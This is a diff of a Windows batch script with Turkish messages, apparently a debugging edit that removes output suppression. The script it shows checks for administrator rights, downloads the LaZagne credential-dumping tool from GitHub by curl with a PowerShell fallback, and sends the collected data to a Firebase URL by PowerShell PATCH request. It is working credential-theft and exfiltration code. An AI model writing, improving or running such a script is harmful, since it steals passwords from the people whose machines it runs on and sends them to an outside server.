@@ -1,4 +1,4 @@
-@echo off
+echo on
 :: Step 1: Yönetici kontrolü
 net session >nul 2>&1
 if %ERRORLEVEL% neq 0 (
@@ -67,11 +67,11 @@ if %ERRORLEVEL% neq 0 (
 :: Step 7: Lazagne indir
 echo [%DATE% %TIME%] Lazagne indiriliyor... >> "%LOGFILE%"
 echo [+] Lazagne indiriliyor...
-curl -L -o lazagne.exe https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe >nul 2>&1
+curl -L -o lazagne.exe https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe
 if %ERRORLEVEL% neq 0 (
     echo [%DATE% %TIME%] HATA: Curl indirme basarisiz, PowerShell ile deneniyor... >> "%LOGFILE%"
     echo [+] HATA: Curl indirme basarisiz, PowerShell ile deneniyor...
-    powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe' -OutFile 'lazagne.exe' } catch { Write-Output ('HATA: PowerShell indirme basarisiz: ' + $_.Exception.Message) | Out-File -FilePath '%LOGFILE%' -Append }" >nul 2>&1
+    powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe' -OutFile 'lazagne.exe' } catch { Write-Output ('HATA: PowerShell indirme basarisiz: ' + $_.Exception.Message) | Out-File -FilePath '%LOGFILE%' -Append }"
     if %ERRORLEVEL% neq 0 (
         echo [%DATE% %TIME%] HATA: PowerShell indirme de basarisiz! >> "%LOGFILE%"
         echo [+] HATA: Dosya indirilemedi, lutfen internet baglantisini kontrol edin.
@@ -147,7 +147,7 @@ echo [+] Firebase URL: %FB%
 echo [%DATE% %TIME%] Firebase’e veri gonderiliyor... >> "%LOGFILE%"
 echo [+] Firebase’e veri gonderiliyor...
 powershell -Command ^
-  "try { $json = '{\"log\":\"%DATA%\"}'; Invoke-RestMethod -Uri '%FB%' -Method PATCH -Body $json -ContentType 'application/json' } catch { Write-Output ('HATA: Firebase gonderim basarisiz: ' + $_.Exception.Message) | Out-File -FilePath '%LOGFILE%' -Append }" >nul 2>&1
+  "try { $json = '{\"log\":\"%DATA%\"}'; Invoke-RestMethod -Uri '%FB%' -Method PATCH -Body $json -ContentType 'application/json' } catch { Write-Output ('HATA: Firebase gonderim basarisiz: ' + $_.Exception.Message) | Out-File -FilePath '%LOGFILE%' -Append }"
 if %ERRORLEVEL% neq 0 (
     echo [%DATE% %TIME%] HATA: Firebase gonderim basarisiz! >> "%LOGFILE%"
     echo [+] HATA: Firebase’e veri gonderilemedi, log dosyasini kontrol edin.
